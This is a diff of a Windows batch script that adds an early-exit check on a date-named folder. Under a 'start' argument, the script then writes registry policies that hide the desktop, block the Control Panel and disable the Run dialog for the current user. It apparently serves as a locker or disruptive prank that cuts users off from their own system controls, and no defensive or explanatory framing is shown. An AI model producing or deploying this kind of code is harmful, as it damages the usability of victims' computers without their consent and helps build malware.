@@ -6,6 +6,8 @@ chcp 65001>nul
 
 
 if "%1" == "start" (
+  for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z exit
+
   for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop            /t REG_DWORD /d 1 /f >nul
   for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel       /t REG_DWORD /d 1 /f >nul
   for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun                /t REG_DWORD /d 1 /f >nul
